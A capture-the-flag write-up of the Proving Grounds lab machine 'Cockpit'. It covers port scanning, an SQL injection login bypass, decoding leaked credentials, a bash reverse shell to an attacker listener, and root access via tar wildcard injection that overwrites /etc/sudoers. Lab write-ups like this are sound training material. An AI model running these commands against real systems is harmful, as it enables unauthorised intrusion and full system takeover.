---
Date: 2024-10-18
Platform: PG-Practice
Category: Linux
Difficulty: Intermediate
Status: Complete
IP: 192.168.244.10
Writeup: https://medium.com/@Dpsypher/proving-grounds-practice-cockpit-7e777892e485
---
# Cockpit


# Resolution summary
- Text
- Text
## Improved skills
- skill 1
- skill 2
## Used tools
- nmap
- gobuster

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN Cockpit.nmap 192.168.244.10 -v
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
9090/tcp open  zeus-admin?
|_drda-info: TIMEOUT
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|     margin: 0 0 10px;
|_    @font-face {
1 service unrecognized despite returning data.
```
---
# Enumeration
## Port 22 - SSH (OpenSSH 8.2p1)
No enumeration conducted
## Port 80 - HTTP (Apache 2.4.41)
- Navigated to `http://192.168.244.10:80` and identified `Apache HTTP Server v 2.4.41`
![[Pasted image 20241018193653.png]]
- Ran `gobuster dir -u http://192.168.244.10 -w //usr/share/dirb/wordlists/big.txt -x php,html,txt` to identify available files - identified `blocked.html` before target machine crashed.
![[Pasted image 20241018195332.png]]
- Navigated to `http://192.168.244.10/blocked.html`
![[Pasted image 20241018194838.png]]
- Viewed source for `http://192.168.244.10/blocked.html` and found no further information
![[Pasted image 20241018194944.png]]
- Forced to revert machine second time because target had crashed again after accessing `blocked.html`
- Re-ran `gobuster` with more threads and 400/403/404 blacklisted:  `gobuster dir -u http://192.168.244.10 -w //usr/share/dirb/wordlists/big.txt -x php,html,txt -t 42 -b 404,403,400` - created many errors but identified `login.php`
![[Pasted image 20241018203838.png]]
- Navigated to `http://192.168.244.10/login.php` and identified `Blaze` login - attempted login with credentials `admin:admin`
![[Pasted image 20241018204055.png]]
- Checked `/usr/share/wordlists/seclists/Fuzzing/Databases` for potential login bypass suggestion - identified `MySQL-SQLi-Login-Bypass.fuzzdb.txt` and viewed it
![[Pasted image 20241018204433.png]]
- Attempted login to `http://192.168.244.10/login.php` with username `'OR '' = '` - gained access to `password-dashboard.php`  and identified encoded passwords
![[Pasted image 20241018204635.png]]
- Copied passwords into `CyberChef` and identified base64-encoded credentials `james:canttouchhhthiss@455152` & `cameron:thisscanttbetouchedd@455152`
![[Pasted image 20241018205151.png]]
![[Pasted image 20241018205343.png]]
## Port 9090 - zeus-admin
- Navigated to `http://192.168.244.10:9090` and received invalid security certificate warning
![[Pasted image 20241018202332.png]]
- Viewed Certificate and identified potential MD5 hash in `Organisation`
![[Pasted image 20241018202436.png]]
- Copied MD5 hash to `cert.hash` and ran `hashcat -m 0 cert.hash /usr/share/wordlists/rockyou.txt --force` - failed to find a match in `rockyou.txt`
![[Pasted image 20241018202921.png]]
- Proceeded to website and identified server login interface and `Ubuntu 20.04.6 LTS`
![[Pasted image 20241018200056.png]]
- Checked page source and identified script for "Cockpit" login
![[Pasted image 20241018201114.png]]
- Attempted password guessing with credentials `admin:admin`
![[Pasted image 20241018200243.png]]
- Attempted password guessing with credentials `admin:password`
![[Pasted image 20241018200333.png]]
- Attempted login with credentials `james:canttouchhhthiss@455152`
![[Pasted image 20241018205834.png]]
- Attempted login with credentials `cameron:thisscanttbetouchedd@455152`
![[Pasted image 20241018205956.png]]

---
# Exploitation
- Reattempted login with credentials `james:canttouchhhthiss@455152`
![[Pasted image 20241018210129.png]]
- Identified "Terminal" and achieved command execution on target - ran `cat local.txt` to print `fa9343d03bf9cbb2e6ae3c5af22043dc`
![[Pasted image 20241018210333.png]]
- Started netcat listener on port `4444` and ran `/bin/bash -i >& /dev/tcp/192.168.45.155/4444 0>&1` on target to establish reverse shell
![[Pasted image 20241018210748.png]]
![[Pasted image 20241018210800.png]]

---
# Privilege Escalation
## Local Enumeration
- Ran `sudo -l` and identified `james` can run `/usr/bin/tar -czvf /tmp/backup.tar.gz *` as root without a password
![[Pasted image 20241018210915.png]]
- Identified [GTFObin for `tar`](https://gtfobins.github.io/gtfobins/tar/) using `sudo`
![[Pasted image 20241018211535.png]]
## Privilege Escalation vector
- Navigated to `/tmp` and ran `touch payload.sh` to create `payload.sh` file, then ran following commands to add to `payload.sh` and setup backup using wildcard 
```
echo "echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers" > payload.sh
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh payload.sh'
```

![[Pasted image 20241018213255.png]]
- Ran command `sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *` 
![[Pasted image 20241018213503.png]]
- Ran `sudo -l` to check new sudo privileges for `james`, ran  `sudo /bin/bash` to become `root`, then ran `cat /root/proof.txt` to print `d8381218cb60a519ac20d2b75b8e1fec`
![[Pasted image 20241018213839.png]]
---
# Trophy & Loot
`local.txt` = `fa9343d03bf9cbb2e6ae3c5af22043dc`
`root.txt` = `d8381218cb60a519ac20d2b75b8e1fec`